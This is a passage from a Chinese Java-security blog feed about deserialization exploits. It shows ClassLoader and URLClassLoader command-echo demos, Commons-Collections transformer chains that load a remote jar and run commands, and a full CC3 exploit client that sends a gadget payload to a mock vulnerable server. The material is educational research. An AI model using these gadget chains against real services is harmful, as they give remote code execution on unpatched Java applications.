class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    只需要传入文件的绝对路径就可以进行转化</span></span><br><span class="line"><span class="comment">     *  需要根据文件大小修改bytes大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename )</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 20m</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    bytes大小需要传入设置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename ,<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单使用demo，将Summer.class文件转化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer.class的绝对路径</span></span><br><span class="line">    <span class="comment">// E:\Soures\JavaLearnVulnerability\Summer.class自行修改</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String file_name = <span class="string">"E:"</span> + File.separator + <span class="string">"Soures"</span> + File.separator + <span class="string">"JavaLearnVulnerability"</span> + File.separator + <span class="string">"Summer.class"</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1600</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FiletoBytes filetoBytes = <span class="keyword">new</span> FiletoBytes(file_name);</span><br><span class="line"><span class="comment">//        System.out.println("直接传入文件，默认bytes大小默认为4kb");</span></span><br><span class="line"><span class="comment">//        System.out.println(filetoBytes.FiletoBytes(file_name));</span></span><br><span class="line">        System.out.println(<span class="string">"传入文件和bytes"</span>);</span><br><span class="line">        System.out.println(filetoBytes.FiletoBytes(file_name,bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>温馨提示：在转文件的时候最好先看看文件大小，传入合适的数组大小。因为后面这些多余出0要删除，否则会报错。<br><img src="https://img-blog.csdnimg.cn/2020060510594243.png" alt="在这里插入图片描述"></p></blockquote><hr><h2 id="defineclass’s-demo"><a href="#defineclass’s-demo" class="headerlink" title="defineclass’s demo"></a>defineclass’s demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String classname = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// 部分字节码，完整获取github。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        defineclass defineclass = <span class="keyword">new</span> defineclass();</span><br><span class="line">        Class cls = defineclass.defineClass(classname,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance("whoami");</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605110551596.png" alt="在这里插入图片描述"></p><hr><h2 id="ccdefineclass"><a href="#ccdefineclass" class="headerlink" title="ccdefineclass"></a>ccdefineclass</h2><p>&emsp;&emsp; 改写cc链，来达到获取回显。这里有一个坑，JDK自带<code>java.lang.ClassLoader</code>类下的defineclass是权限是<code>protected</code>不能直接通过反射调用，故不顾虑使用这个类，笔者使用的是weblogic中的<code>wlfullclient.jar!.org.mozilla.classfile.DefiningClassLoader</code>。<br>笔者这里只给出部分实现代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="comment">//                new ConstantTransformer(ClassLoader.class),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class,byte[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"summer.classload.Summer"</span>,bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"Exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"ipconfig"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="URLClassLoader远程加载文件回显"><a href="#URLClassLoader远程加载文件回显" class="headerlink" title="URLClassLoader远程加载文件回显"></a>URLClassLoader远程加载文件回显</h1><p>&emsp;&emsp; URLClassLoader是<code>java.net</code>下的类，继承了<code>java.lang.Classloader</code>类对象。URLClassLoader可以从远端或者本地加载jar/class文件。</p><p><img src="https://img-blog.csdnimg.cn/20200605154823661.png" alt="在这里插入图片描述"></p><hr><h2 id="URLClassLoader’s-Demo"><a href="#URLClassLoader’s-Demo" class="headerlink" title="URLClassLoader’s Demo"></a>URLClassLoader’s Demo</h2><ol><li>编写exp代码，代码已经上传至GitHub项目中。</li><li>编译<code>javac Summer.java</code></li><li>创建http服务 <code>py -2 -m SimpleHTTPServer  8090</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605160339489.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605170754423.gif" alt="在这里插入图片描述"></p><hr><h2 id="CCURLClassLoader"><a href="#CCURLClassLoader" class="headerlink" title="CCURLClassLoader"></a>CCURLClassLoader</h2><p>&emsp;&emsp; 同样使用cc链来改造此回显方法，<code>试想一下把这个jar换成msf的payload可以达到什么效果呢？</code>这里我不实现，自己可以去脑洞实现一下，很简单的，我相信看过我文章的人都应该会。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL("http://127.0.0.1:8090/summer.jar")&#125;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"summer"&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getConstructor"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new String[]&#123;"ipconfig"&#125;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 笔者这里总结都是以CC链为改造基础，其实CC还有很多玩法，大家可以脑洞一下，Java反序列化回显也不止本文中两种，比例说RMI、weblogic的T3协议。学习无止境，努力就完事。</p><p><code>于无常处知有情，于有情处知众生..........</code></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a><br><a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">https://xz.aliyun.com/t/7740</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题外话&quot;&gt;&lt;a href=&quot;#题外话&quot; class=&quot;headerlink&quot; title=&quot;题外话&quot;&gt;&lt;/a&gt;题外话&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Commons-Collections反序列化</title>
    <link href="https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-26T13:27:45.000Z</published>
    <updated>2020-05-20T08:19:17.580Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 前言</p><p>&emsp;&emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过<code>ysoserial--Gadget--URLDNS</code>，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者没说。<br>&emsp;&emsp; Java的第一个反序列化漏洞就是从<code>commons-collections</code>组件中发现的，从此打开了Java安全的新蓝图。<br>官方对<code>commons-collections</code>组件的说明：<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>翻译一下大概意思就是：<code>Java commons-collections 框架是JDK 1.2之后中的一个重要补充。增加了许多强大的数据结构，加快了Java应用程序的开发。已经成为Java中公认的集合处理标准。</code><br>&emsp;&emsp; 目前<code>commons-collections</code>的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>&emsp;&emsp; 先看一下Gadget链，入口是上篇文章提及的。这里的3是指版本号，笔者这里只分析网上流传的某一条利用链。<code>BadAttributeValueExpException.readObject()</code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 试想一下先存在一个服务器，它正好存在使用<code>commons-collections</code>组件，没有做任何的修复，存在漏洞。此时你是不是就能利用此漏洞呢？</p><hr><h2 id="模拟场景DEMO"><a href="#模拟场景DEMO" class="headerlink" title="模拟场景DEMO"></a><strong>模拟场景DEMO</strong></h2><h3 id="创建模拟服务器应用"><a href="#创建模拟服务器应用" class="headerlink" title="创建模拟服务器应用"></a>创建模拟服务器应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 模拟服务器端，接受反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器监听地址： "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="comment">// 接受反序列化数据</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"与地址： "</span> + socket.getInetAddress() + <span class="string">"连接！"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"读取数据完成！"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"读取数据失败！"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//目的服务器地址</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建漏洞map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建异常，在反序列化时触发payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h3><p>首先得让模拟服务器在运行，然后发送payload即可。<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 分析必定要先断点，这里笔者将代码修改了，便于分析。这里就不再贴出，需要的可以去<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>上自取，断点直接设置在<code>readObject</code>方法。<br><code>温馨提示</code>：如果你用的是Idea工具，在Debug之前请查看自己Debugger设置，请和我一样设置。为什么要这么做可以参考：<a href="https://samny.blog.csdn.net/article/details/105937958" 